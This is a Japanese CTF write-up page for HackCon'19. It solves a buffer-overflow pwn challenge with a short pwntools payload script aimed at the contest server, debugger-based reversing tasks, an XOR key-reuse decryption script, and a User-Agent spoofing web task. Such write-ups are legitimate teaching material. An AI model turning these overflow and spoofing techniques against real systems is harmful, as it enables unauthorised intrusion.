@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+		<title>HackCon&#39;19 write up &middot; Light Hugo</title>
+		<link rel="canonical" href="https://kuzushiki.github.io/post/hackcon2019/">
+		<link rel="stylesheet" type="text/css" href="https://kuzushiki.github.io/css/main.css" />
+		
+	</head>
+	<body>
+		<a id="title" href="https://kuzushiki.github.io/" title="Light Hugo">
+			
+				<img id="logo" alt="Logo" src="https://kuzushiki.github.io/images/logo.png" />
+			
+			
+				<h1>Light Hugo</h1>
+			
+		</a>
+		
+			<h4>Describe your website</h4>
+		
+		<div id="social">
+			
+			
+			<a href="mailto:john@example.org" title="Email">
+				<img alt="Email" height="64px" width="64px" src="https://kuzushiki.github.io/images/email.svg" />
+			</a>
+			
+			
+			<a href="https://github.com/tblyler" title="Github">
+				<img alt="GitHub" height="64px" width="64px" src="https://kuzushiki.github.io/images/github.svg" />
+			</a>
+			
+			
+			<a href="https://facebook.com/johndoe" title="Facebook">
+				<img alt="Facebook" height="64px" width="64px" src="https://kuzushiki.github.io/images/facebook.svg" />
+			</a>
+			
+			
+			<a href="https://twitter.com/tonyblyler" title="Twitter">
+				<img alt="Twitter" height="64px" width="64px" src="https://kuzushiki.github.io/images/twitter.svg" />
+			</a>
+			
+			
+			<a href="https://linkedin.com/in/johndoe" title="LinkedIn">
+				<img alt="LinkedIn" height="64px" width="64px" src="https://kuzushiki.github.io/images/linkedin.svg" />
+			</a>
+			
+                        
+		</div>
+		<div class="links">
+			<a href="https://kuzushiki.github.io/">Home</a>
+			
+				<a href="https://kuzushiki.github.io/post/">Archive</a>
+			
+			
+				
+			
+				
+					<a href="https://kuzushiki.github.io/pages/resume/">Résumé</a>
+				
+			
+		</div>
+
+	<div class="postBody">
+		<div class="post">
+			<h1>HackCon&#39;19 write up</h1>
+			<span class="post-meta">Fri, Feb 14, 2020 - Read in 2 Min</span>
+			<div class="content">
+			<nav id="TableOfContents">
+  <ul>
+    <li><a href="#ポイント">ポイント</a></li>
+    <li><a href="#解く">解く</a></li>
+    <li><a href="#補足">補足</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#ポイント-1">ポイント</a></li>
+    <li><a href="#解く-1">解く</a></li>
+    <li><a href="#補足-1">補足</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#解く-2">解く</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#解く-3">解く</a></li>
+    <li><a href="#補足-2">補足</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#解く-4">解く</a></li>
+    <li><a href="#補足-3">補足</a></li>
+  </ul>
+</nav>
+			<p>HackCon&rsquo;19に参加しました！
+(team:score_gazer)</p>
+<p>結果は705点で112位でした</p>
+<h1 id="baby-b0f-pwn-100-pt">baby b0f (Pwn 100 pt)</h1>
+<h2 id="ポイント">ポイント</h2>
+<ul>
+<li>バッファオーバーフロー（以下BOF）</li>
+</ul>
+<h2 id="解く">解く</h2>
+<p>プログラムを実行するといきなり入力を求められる</p>
+<ul>
+<li>間違った入力をすると<code>Try Again</code>と表示される</li>
+</ul>
+<p>デバッガで逆アセンブルしつつ実行</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/63631108-aab8b280-c65d-11e9-9de6-03d1556c2fa0.PNG" alt="image"></p>
+<p>どうやらこの比較命令が怪しい</p>
+<pre><code>RIP: 0x400760 (&lt;main+153&gt;:	cmp    DWORD PTR [rbp-0x4],0xdeadbeef)
+</code></pre><p>BOFしてここを一致させることを考える</p>
+<p>以下のコマンドでrsp,rbpを表示</p>
+<pre><code>x/32xw $rsp
+x/32xw $rbp
+</code></pre><p>以下の行に注目</p>
+<pre><code>0x7fffffffdeb0:	0x4141dfa0	0x000a4141	0x00000000	0xcafebabe
+</code></pre><p>今回は<code>AAAA</code>と入力したが，その入力値が確認できる(<code>A</code>は<code>0x41</code>に相当)</p>
+<p>さらに，<code>0xcafebabe</code>は<code>[rbp-0x4]</code>であることも分かる</p>
+<p>つまり，<code>0xcafebabe</code>の部分を<code>0xdeadbeef</code>にできれば良い</p>
+<p>ペイロードを作ってサーバに投げるプログラムを作って実行</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solve.py" data-lang="solve.py"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> socket
+
+con <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">68.183.158.95</span><span style="color:#e6db74">&#39;</span>, <span style="color:#ae81ff">8989</span>)
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xef</span><span style="color:#ae81ff">\xbe</span><span style="color:#ae81ff">\xad</span><span style="color:#ae81ff">\xde</span><span style="color:#e6db74">&#39;</span>
+
+con<span style="color:#f92672">.</span>sendline(payload)
+con<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>フラグゲット</p>
+<h2 id="補足">補足</h2>
+<ul>
+<li>
+<p>実は初めて解いたPwn問だったりする</p>
+</li>
+<li>
+<p>Pwntoolsを使用してます</p>
+<ul>
+<li><a href="https://hiziriai.hatenablog.com/entry/2017/09/18/124628">参考資料</a></li>
+</ul>
+</li>
+</ul>
+<h1 id="babyrev-reversing-100-pt">babyrev (Reversing 100 pt)</h1>
+<h2 id="ポイント-1">ポイント</h2>
+<ul>
+<li>とりあえずデバッグしてみる</li>
+</ul>
+<h2 id="解く-1">解く</h2>
+<p>逆アセンブルしてみるも，<code>main</code>には重要そうな処理が無い</p>
+<p><code>begin</code>や<code>check</code>，<code>end</code>が怪しそう</p>
+<p>それぞれにブレークポイントを設置，ステップ実行してみる</p>
+<p><code>end</code>をちょっとずつ実行していると，なにやらフラグらしきものが１文字ずつ現れる</p>
+<p>フラグゲット</p>
+<h2 id="補足-1">補足</h2>
+<p><code>main</code>からどうやって<code>end</code>に行ってるのか良く分からなかった</p>
+<h1 id="break-it-baby-reversing-304-pt">Break It Baby (Reversing 304 pt)</h1>
+<h1 id="ポイント-2">ポイント</h1>
+<ul>
+<li>処理を全部理解しなくても解ける</li>
+</ul>
+<h2 id="解く-2">解く</h2>
+<p>実行すると<code>Dare use IDA</code>と出てくる（「IDAで解析しろ」と言われてる？）</p>
+<p>IDAで解析する</p>
+<p>処理を簡単にまとめると以下のようになってる</p>
+<ul>
+<li>
+<p><code>main</code>で入力を10進数として受け取り（以下<code>input</code>）<code>test</code>へ</p>
+</li>
+<li>
+<p><code>test</code>で0x1673660から<code>input</code>を引き，その結果（以下<code>result</code>）によって分岐</p>
+</li>
+</ul>
+<p><code>result</code>が0~21：<code>decrypt</code>へ進む（<code>result</code>の値を引数としている）</p>
+<p>それ以外：<code>result</code>に乱数を代入し<code>decrypt</code>へ進む</p>
+<p>正規ルートが乱数の処理を通るとは思えないので，<code>input</code>は以下の式を満たす10進数だと推測</p>
+<pre><code>input = 0x1673660 - i (i = 1 ... 21)
+</code></pre><p>21通りしかないので総当り</p>
+<p>フラグゲット</p>
+<h1 id="otp-crypto-100-pt">OTP (Crypto 100 pt)</h1>
+<h1 id="ポイント-3">ポイント</h1>
+<ul>
+<li>
+<p>ある値に対して，同じ値を２回XORしても値は変わらない</p>
+</li>
+<li>
+<p>XORの演算は入れ替え可能</p>
+</li>
+</ul>
+<h2 id="解く-3">解く</h2>
+<p>フラグが２つのmessageに分割されており，
+message1とmessage2に同じkeyをXOR（記号：^）して暗号化されてる</p>
+<p>また，それぞれのmessageには必ず<code>meme</code>という文字が含まれている</p>
+<p>復号するためには，上記のポイントより，以下の計算を行う</p>
+<pre><code>(message1 or 2の暗号文) ^ (message1 or 2の分かってる部分) ^ (message2 or 1の暗号文)
+</code></pre><ul>
+<li>暗号文 ^ (<code>meme</code>や<code>d4rk{</code>，<code>}c0de</code>)より，対応する部分のkeyを求められ，もう一方のmessageを部分的に復元できる</li>
+</ul>
+<p>例えばこんなかんじで×の部分が復号できる</p>
+<p>message1の暗号文: ○　○　○　○　○　○　○　○　○　○</p>
+<p>message1既知部分: m　e　m　e</p>
+<p>message2の暗号文: ×　×　×　×　○　○　○　○　○　○</p>
+<ul>
+<li>上記の計算をするプログラムを作って実行する</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solve.py" data-lang="solve.py">c1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x05</span><span style="color:#e6db74">F</span><span style="color:#ae81ff">\x17</span><span style="color:#ae81ff">\x12</span><span style="color:#ae81ff">\x14</span><span style="color:#ae81ff">\x18</span><span style="color:#ae81ff">\x01</span><span style="color:#ae81ff">\x0c</span><span style="color:#ae81ff">\x0b</span><span style="color:#e6db74">4</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>hex()
+c2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt;</span><span style="color:#ae81ff">\x1f</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x14</span><span style="color:#ae81ff">\n</span><span style="color:#ae81ff">\x08</span><span style="color:#ae81ff">\x07</span><span style="color:#e6db74">Q</span><span style="color:#ae81ff">\n</span><span style="color:#ae81ff">\x0e</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>hex()
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">convert_cipher</span>(cipher):
+    l_cipher <span style="color:#f92672">=</span> list(cipher)
+    L <span style="color:#f92672">=</span> len(l_cipher)
+    h_cipher <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(L <span style="color:#f92672">/</span><span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>):
+        tmp <span style="color:#f92672">=</span> l_cipher[i <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>: i <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>]
+        tmp <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">0x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>join(tmp)
+        h_cipher<span style="color:#f92672">.</span>append(tmp)
+    <span style="color:#66d9ef">print</span>(h_cipher)
+    <span style="color:#66d9ef">return</span> h_cipher
+
+h_c1 <span style="color:#f92672">=</span> convert_cipher(c1)
+h_c2 <span style="color:#f92672">=</span> convert_cipher(c2)
+
+dec <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span>
+
+dec[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">d</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">16</span>))
+dec[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">4</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>))
+dec[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">16</span>))
+dec[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">k</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">3</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">3</span>], <span style="color:#ae81ff">16</span>))
+dec[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">4</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">4</span>], <span style="color:#ae81ff">16</span>))
+dec[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">5</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">5</span>], <span style="color:#ae81ff">16</span>))
+dec[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">c</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">6</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">6</span>], <span style="color:#ae81ff">16</span>))
+dec[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">0</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">7</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">7</span>], <span style="color:#ae81ff">16</span>))
+dec[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">d</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">8</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">8</span>], <span style="color:#ae81ff">16</span>))
+dec[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">e</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">9</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">9</span>], <span style="color:#ae81ff">16</span>))
+
+m1 <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">d4rk{</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>):
+    m1 <span style="color:#f92672">+</span><span style="color:#f92672">=</span> dec[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>]
+
+m2 <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>):
+    m2 <span style="color:#f92672">+</span><span style="color:#f92672">=</span> dec[i]
+m2 <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">}c0de</span><span style="color:#e6db74">&#34;</span>
+
+<span style="color:#66d9ef">print</span>(m1 <span style="color:#f92672">+</span> m2)
+</code></pre></div><p>フラグゲット</p>
+<h2 id="補足-2">補足</h2>
+<p>両方のmessageはともに10文字なので，<code>meme</code>のヒントは無くても解ける
+（<code>d4rk{</code>，<code>}c0de</code>は計10文字かつ位置がかぶらない）</p>
+<p>message1の暗号文: ○　○　○　○　○　×　×　×　×　×</p>
+<p>message既知部分　: d　4　r　k　{　}　c　0　d　e</p>
+<p>message2の暗号文: ×　×　×　×　×　○　○　○　○　○</p>
+<h1 id="secret-agent-web-100-pt">Secret Agent (Web 100 pt)</h1>
+<h1 id="ポイント-4">ポイント</h1>
+<ul>
+<li>
+<p>使用しているブラウザの種類は<strong>UserAgent</strong>で判別できる</p>
+</li>
+<li>
+<p><strong>UserAgent</strong>は偽装できる</p>
+</li>
+</ul>
+<h2 id="解く-4">解く</h2>
+<p><a href="http://68.183.158.95/secret_agent/">問題ページ</a>に飛ぶと以下の文章が．</p>
+<ul>
+<li>Should d4rkc0de make their own browser</li>
+</ul>
+<p>firefoxとかではなくオリジナルのブラウザでしかフラグが確認できない？</p>
+<p>ということでUserAgentを以下に書き換える</p>
+<ul>
+<li>Should d4rkc0de make their own browser</li>
+</ul>
+<p>フラグゲット</p>
+<h2 id="補足-3">補足</h2>
+<p>たまたまページ内の文章を入れたら上手く行ったが，&ldquo;my browser&quot;とかでは駄目だった．</p>
+<p>どこかから推測する問題だったのかも？</p>
+<h1 id="終わりに">終わりに</h1>
+<p>今回のCTF，個人的にはものすごく楽しめました
+<del>サーバに全然繋がらなかった…</del></p>
+<p>CTF，Qiitaともに初心者なので，ちゃんと書けているか不安です&hellip;
+間違いなどあれば遠慮なくコメントください！</p>
+
+			</div>
+		</div>
+	</div>
+		<div class="links">
+			<a href="https://kuzushiki.github.io/">Home</a>
+			
+				<a href="https://kuzushiki.github.io/post/">Archive</a>
+			
+			
+				
+			
+				
+					<a href="https://kuzushiki.github.io/pages/resume/">Résumé</a>
+				
+			
+			<a href="#top">Top</a>
+		</div>
+		
+		
+		<p id="copyright">
+			© Copyright 2016 John Doe
+		</p>
+		
+	</body>
+</html>
+
